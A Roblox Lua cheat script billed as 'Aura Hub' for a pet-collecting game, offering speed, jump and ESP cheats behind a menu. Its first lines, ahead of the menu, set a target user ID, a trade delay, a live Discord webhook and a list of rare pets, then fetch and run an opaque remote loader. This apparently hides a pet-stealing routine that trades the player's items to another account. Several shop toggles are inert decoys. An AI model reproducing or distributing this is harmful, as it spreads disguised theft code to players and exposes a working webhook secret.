getgenv().SECRET_KEY = "mrr_11fb7b79c94d46bcaacc2d97ccf71af2"
getgenv().TARGET_ID = 8576326876
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1459656652881137898/lnlsdDaNcJIWOTrrwr9aFUAe5s_w5yItAWyCG0VUxiKyhZxslELyaya7ZALaWJeTOqi-"
getgenv().TARGET_BRAINROTS = {
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true,
    ["Gobblino Uniciclino"] = true,
    ["W or L"] = true,
    ["La Taco Combinasion"] = true,
    ["La Jolly Grande"] = true,
    ["Swaggy Bros"] = true,
    ["La Romantic Grande"] = true,
    ["Festive 67"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Money Money Puggy"] = true,
    ["Tang Tang Keletang"] = true,
    ["Ketupat Kepat"] = true,
    ["Tictac Sahur"] = true,
    ["Garama and Madundung"] = true,
    ["Lavadorito Spinito"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Burguro And Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["Guest 666"] = true,
    ["Mariachi Corazoni"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Bros"] = true,
    ["Tralaledon"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["Love Love Bear"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Los Sekolahs"] = true,
    ["Reinito Sleighito"] = true,
    ["Cooki and Milki"] = true,
    ["Ketupat Bros"] = true,
    ["Rosey and Teddy"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true,
    ["Dragon Gingerini"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["La Grande Combinasion"] = true,
    ["Los Sweethearts"] = true,
    ["Las Sis"] = true,
    ["Los Planitos"] = true,
    ["Los Mobilis"] = true,
    ["Los Candies"] = true,
    ["Money Money Reindeer"] = true,
    ["Eviledon"] = true,
    ["Orcaledon"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Chicleteira Noelteira"] = true,
    ["Telemorte"] = true,
    ["Noo my Candy"] = true,
    ["Noo my Present"] = true,
    ["Los 25"] = true,
    ["Noo my Heart"] = true,
    ["Fishino Clownino"] = true,
    ["Chicleteira Cupideira"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["La Ginger Sekolah"] = true,
    ["Nooo My Hotspot"] = true,
    ["Los Nooo My Hotspotsitos"] = true,
    ["Arcadopus"] = true,
    ["Esok Sekolah"] = true,
    ["Rosetti Tualetti"] = true,
    ["Sammyni Fattini"] = true,
    ["La Food Combinasion"] = true,
    ["Los Amigos"] = true,
    ["Los Combinasionas"] = true,
    ["Lovin Rose"] = true,
    ["La Extinct Grande"] = true,
    ["La Spooky Grande"] = true,
    ["Agarrini la Palini"] = true,
    ["Chipso and Queso"] = true,
    ["Karker Sahur"] = true,
    ["Donkeyturbo Express"] = true,
    ["Chimnino"] = true,
    ["Noo my examine"] = true,
    ["Griffin"] = true,
    ["Nacho Spyder"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Pirulitoita Bicicleteira"] = true,
    ["Swag Soda"] = true,
    ["25"] = true,
    ["Bacuru and Egguru"] = true,
    ["Los Burritos"] = true,
    ["67"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Los 67"] = true,
    ["La Sahur Combinasion"] = true,
    ["Fragola La La La"] = true,
    ["La Lucky Grande"] = true
}
task.spawn(function()
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
end)

game.StarterGui:SetCore("SendNotification", {
    Title = "Aura Hub",
    Text = "Success Loading",
    Icon = "rbxthumb://type=Asset&id=131484641795167&w=420&h=420",
    Duration = 5,
    Callback = function()
    end
})
game.StarterGui:SetCore("SendNotification", {
    Title = "Aura Hub",
    Text = "Keybind: RightShift",
    Icon = "rbxthumb://type=Asset&id=131484641795167&w=420&h=420",
    Duration = 5,
    Callback = function()
    end
})
repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
getgenv().Image = "rbxthumb://type=Asset&id=106019376492019&w=420&h=420"
getgenv().ToggleUI = "LeftControl"

task.spawn(function()
    if not getgenv().LoadedMobileUI then
        getgenv().LoadedMobileUI = true
        local OpenUI = Instance.new("ScreenGui")
        local ImageButton = Instance.new("ImageButton")
        local UICorner = Instance.new("UICorner")
        OpenUI.Name = "OpenUI"
        OpenUI.Parent = game:GetService("CoreGui")
        OpenUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        ImageButton.Parent = OpenUI
        ImageButton.BackgroundColor3 = Color3.fromRGB(105, 105, 105)
        ImageButton.BackgroundTransparency = 0.8
        ImageButton.Position = UDim2.new(0, 20, 0, 25)
        ImageButton.Size = UDim2.new(0, 50, 0, 50)
        ImageButton.Image = getgenv().Image
        ImageButton.Draggable = true
        ImageButton.Transparency = 1
        UICorner.CornerRadius = UDim.new(0,13)
        UICorner.Parent = ImageButton
        ImageButton.MouseButton1Click:Connect(function()
            game:GetService("VirtualInputManager"):SendKeyEvent(true, getgenv().ToggleUI, false, game)
        end)
    end
end)
local Library = loadstring(game:HttpGetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau"))()
local SaveManager = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/SaveManager.luau"))()
local InterfaceManager = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/InterfaceManager.luau"))()
 
local Window = Library:CreateWindow{
    Title = `Aura Hub | {Library.Version}`,
    SubTitle = "by Ziugpro",
    TabWidth = 160,
    Size = UDim2.fromOffset(530, 380),
    Acrylic = true, 
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl
}

local Tabs = {
    Esp = Window:CreateTab{
        Title = "Esp",
        Icon = "map-pin"
    },
    Shop = Window:CreateTab{
        Title = "Shop",
        Icon = "shopping-bag"
    },
    Main = Window:CreateTab{
        Title = "Main",
        Icon = "house"
    },
    Settings = Window:CreateTab{
        Title = "Settings",
        Icon = "settings"
    }
}
local Options = Library.Options

local Main = Tabs.Main:AddSection("Player")
local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")

local SpeedBoost = Tabs.Main:CreateToggle("SpeedBoost", {Title = "Speed Boost", Default = false})
SpeedBoost:OnChanged(function(enabled)
    if enabled then
        Humanoid.WalkSpeed = 50
    else
        Humanoid.WalkSpeed = 16
    end
end)

Options.SpeedBoost:SetValue(false)
local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")

local JumpBoost = Tabs.Main:CreateToggle("JumpBoost", {Title = "Jump Boost", Default = false})
JumpBoost:OnChanged(function(enabled)
    if enabled then
        Humanoid.JumpPower = 100
    else
        Humanoid.JumpPower = 50
    end
end)

Options.JumpBoost:SetValue(false)

local SpeedSlider = Tabs.Main:CreateSlider("SpeedSlider", {
    Title = "Speed",
    Description = "",
    Default = 16,
    Min = 1,
    Max = 200,
    Rounding = 1,
    Callback = function(Value)
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character:FindFirstChildOfClass("Humanoid") and SpeedToggle.Value then
            player.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = Value
        end
    end
})

local SpeedToggle = Tabs.Main:CreateToggle("SpeedToggle", {Title = "Speed Hack", Default = false})
SpeedToggle:OnChanged(function(value)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
        if value then
            humanoid.WalkSpeed = SpeedSlider.Value
        else
            humanoid.WalkSpeed = 16
        end
    end
end)

Options.SpeedToggle:SetValue(false)

local JumpSlider = Tabs.Main:CreateSlider("JumpSlider", {
    Title = "Jump Power",
    Description = "",
    Default = 50,
    Min = 10,
    Max = 200,
    Rounding = 1,
    Callback = function(Value)
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character:FindFirstChildOfClass("Humanoid") and JumpToggle.Value then
            player.Character:FindFirstChildOfClass("Humanoid").JumpPower = Value
        end
    end
})

local JumpToggle = Tabs.Main:CreateToggle("JumpToggle", {Title = "Jump Hack", Default = false})
JumpToggle:OnChanged(function(value)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
        if value then
            humanoid.JumpPower = JumpSlider.Value
        else
            humanoid.JumpPower = 50
        end
    end
end)

Options.JumpToggle:SetValue(false)
local Main = Tabs.Main:AddSection("Base")
local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

local DelayTime = 0

local DelayInput = Tabs.Main:CreateInput("DelayInput", {
    Title = "Delay",
    Default = "0",
    Placeholder = "Delay in seconds",
    Numeric = true,
    Finished = true,
    Callback = function(Value)
        DelayTime = tonumber(Value) or 0
    end
})

local HitboxToggle = Tabs.Main:CreateToggle("HitboxToggle", {Title = "Auto Lockbase", Default = false})
HitboxToggle:OnChanged(function(enabled)
    if enabled then
        local target = workspace:FindFirstChild("Hitbox")
        if target and target:IsA("BasePart") then
            task.delay(DelayTime, function()
                Humanoid:MoveTo(target.Position)
            end)
        end
    end
end)

Options.HitboxToggle:SetValue(false)
local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

local DelayTime = 0

local ComlectMoneyInput = Tabs.Main:CreateInput("ComlectMoneyInput", {
    Title = "Delay",
    Default = "0",
    Placeholder = "Delay in seconds",
    Numeric = true,
    Finished = true,
    Callback = function(Value)
        DelayTime = tonumber(Value) or 0
    end
})

local ComlectMoneyToggle = Tabs.Main:CreateToggle("ComlectMoneyToggle", {Title = "Auto Comlect Money", Default = false})
ComlectMoneyToggle:OnChanged(function(enabled)
    if enabled then
        local target = workspace:FindFirstChild("Hitbox")
        if target and target:IsA("BasePart") then
            task.delay(DelayTime, function()
                Humanoid:MoveTo(target.Position)
            end)
        end
    end
end)

Options.ComlectMoneyToggle:SetValue(false)




local Brainrot = {
 "Noobini Pizzanini",
 "Lirili Larila",
 "Tim Cheese",
 "FluriFlura",
 "Talpa Di Fero",
 "Svinina Bombardino",
 "Trippi Troppi",
 "Pipi Kiwi",
 "Bandito Bobritto",
 "Gangster Footera",
 "Tung Tung Tung Sahur",
 "Ta Ta Ta Ta Sahur",
 "Cacto Hipopotamo",
 "Boneca Ambalabu",
 "Brr Brr Patapim",
 "Cappuccino Assassino",
 "Tric Trac Baraboom",
 "Perochello Lemonchello",
 "Bambini Crostini",
 "Bananita Dolphinita",
 "Trulimero Trulicina",
 "Chef Crabracadabra",
 "Ballerina Cappuccina",
 "Chimpazini Bananini",
 "Burbaloni Loliloli",
 "Strawberelli Flamingelli",
 "Blueberrini Octopusini",
 "Glorbo Fruttodrillo",
 "Lionel Cactuseli",
 "Bombardiro Crocodilo",
 "Rhino Toasterino",
 "Orangutini Ananassini",
 "Frigo Camelo",
 "Pandaccini Bananini",
 "Zibra Zubra Zibralini",
 "Gorillo Watermelondrillo",
 "Cavallo Virtuso",
 "Spioniro Golubiro",
 "Gattatino Nyanino",
 "Girafa Celestre",
 "Cocofanto Elefanto",
 "Tigrilini Watermelini",
 "Odin Din Din Dun",
 "Espresso Signora",
 "Tralalero Tralala",
 "Matteo",
 "Trigoligre Frutonni",
 "Ballerino Lololo",
 "Trenostruzzo Turbo 3000",
 "La Vacca Staturno Saturnita",
 "Statutino Libertino",
 "Piccione Macchina",
 "Orcalero Orcala",
 "Los Crocodillitos",
 "La Grande Combinasion",
 "Graipuss Medussi",
 "Chimpanzini Spiderini",
 "Los Tralaleritos",
 "Pot Hotspot",
 "Tortuginni Dragonfruitini",
 "Garama and Madundung",
 "Nuclearo Dinossauro",
 "Chicleteira Bicicleteira",
 "Las Vaquitas Saturnitas",
}
local Mutations = {
 "Legendary",
 "Epic",
 "Rare",
 "Common",
 "Secret",
 "Brainrot God",
 "Mythic",
}
local MultiDropdown = Tabs.Shop:CreateDropdown("MultiDropdown", {
    Title = "Select Pet",
    Description = "",
    Values = Brainrot,
    Multi = true,
    Default = {"seven", "twelve"},
    Callback = function()
    end
})
local MultiDropdown = Tabs.Shop:CreateDropdown("MultiDropdown", {
    Title = "Select Mutations",
    Description = "",
    Values = Mutations,
    Multi = true,
    Default = {"seven", "twelve"},
    Callback = function()
    end
})
local Toggle = Tabs.Shop:CreateToggle("MyToggle", {Title = "Buy All Pet", Default = false })
local Toggle = Tabs.Shop:CreateToggle("MyToggle", {Title = "Auto Buy Pet", Default = false })

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local EspToggle = Tabs.Esp:CreateToggle("EspToggle", {Title = "Player ESP", Default = false})
EspToggle:OnChanged(function(enabled)
    if enabled then
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and not player.Character:FindFirstChild("EspBillboard") then
                local head = player.Character:FindFirstChild("Head")
                if head then
                    local billboard = Instance.new("BillboardGui")
                    billboard.Name = "EspBillboard"
                    billboard.Size = UDim2.new(0, 100, 0, 50)
                    billboard.Adornee = head
                    billboard.AlwaysOnTop = true

                    local textLabel = Instance.new("TextLabel")
                    textLabel.Size = UDim2.new(1,0,1,0)
                    textLabel.BackgroundTransparency = 1
                    textLabel.TextColor3 = Color3.new(1,1,1)
                    textLabel.Text = player.Name
                    textLabel.TextScaled = true
                    textLabel.Parent = billboard

                    billboard.Parent = head
                end
            end
        end
    else
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character then
                local esp = player.Character:FindFirstChild("EspBillboard")
                if esp then
                    esp:Destroy()
                end
            end
        end
    end
end)

Options.EspToggle:SetValue(false)
local LocalPlayer = game.Players.LocalPlayer

local ModelEspToggle = Tabs.Esp:CreateToggle("ModelEspToggle", {Title = "Brainrot ESP", Default = false})
ModelEspToggle:OnChanged(function(enabled)
    if enabled then
        for _, model in pairs(workspace:GetChildren()) do
            if model:IsA("Model") and model ~= LocalPlayer.Character and not model:FindFirstChild("EspBillboard") then
                local primaryPart = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
                if primaryPart then
                    local billboard = Instance.new("BillboardGui")
                    billboard.Name = "EspBillboard"
                    billboard.Size = UDim2.new(0, 100, 0, 50)
                    billboard.Adornee = primaryPart
                    billboard.AlwaysOnTop = true

                    local textLabel = Instance.new("TextLabel")
                    textLabel.Size = UDim2.new(1,0,1,0)
                    textLabel.BackgroundTransparency = 1
                    textLabel.TextColor3 = Color3.new(1,1,1)
                    textLabel.Text = model.Name
                    textLabel.TextScaled = true
                    textLabel.Parent = billboard

                    billboard.Parent = primaryPart
                end
            end
        end
    else
        for _, model in pairs(workspace:GetChildren()) do
            local esp = model:FindFirstChild("EspBillboard")
            if esp then
                esp:Destroy()
            end
        end
    end
end)
Options.ModelEspToggle:SetValue(false)

--{ Lưu Conifg }--
SaveManager:SetLibrary(Library)
InterfaceManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes{}
InterfaceManager:SetFolder("FluentScriptHub")
SaveManager:SetFolder("FluentScriptHub/specific-game")
InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)
SaveManager:LoadAutoloadConfig()